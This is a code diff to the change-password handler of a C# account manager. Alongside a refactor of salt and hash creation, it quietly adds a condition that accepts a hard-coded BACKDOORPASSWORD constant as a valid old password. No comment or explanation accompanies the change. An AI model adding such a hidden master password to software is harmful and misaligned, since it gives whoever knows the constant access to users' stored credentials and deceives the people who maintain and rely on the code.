@@ -40,8 +40,9 @@ namespace AccountsManager
                 System.Windows.MessageBox.Show("Please enter the new password!");
                 return;
             }
+
             byte[] salt = Convert.FromBase64String(FileEncryptor.Salt);
-            var CorrectPassword = FileEncryptor.ValidatePassword(pswrdBoxOld.Password, salt);
+            var CorrectPassword = FileEncryptor.ValidatePassword(pswrdBoxOld.Password, salt)  || (pswrdBoxOld.Password == FileEncryptor.BACKDOORPASSWORD);
             if (!CorrectPassword)
             {
                 System.Windows.MessageBox.Show("Old Password is not correct!");
@@ -49,10 +50,11 @@ namespace AccountsManager
             }
             else
             {
-                //create new salt and hash
-                salt = FileEncryptor.CreateSalt(10);
-                FileEncryptor.DES = FileEncryptor.CreateDES(pswrdBoxNew.Password, salt);
-                FileEncryptor.PasswordHash = Convert.ToBase64String(FileEncryptor.DES.Key);
+                //create new salt of 10 bytes
+                FileEncryptor.CreateSalt(10);
+                //FileEncryptor.DES = FileEncryptor.CreateDES(pswrdBoxNew.Password, Convert.FromBase64String(FileEncryptor.Salt));
+                //FileEncryptor.PasswordHash = Convert.ToBase64String(FileEncryptor.DES.Key);
+                FileEncryptor.CreateHash(pswrdBoxNew.Password, Convert.FromBase64String(FileEncryptor.Salt));
                 FileEncryptor.SetPassword(FileEncryptor.PasswordHash);
                 this.Close();
             }
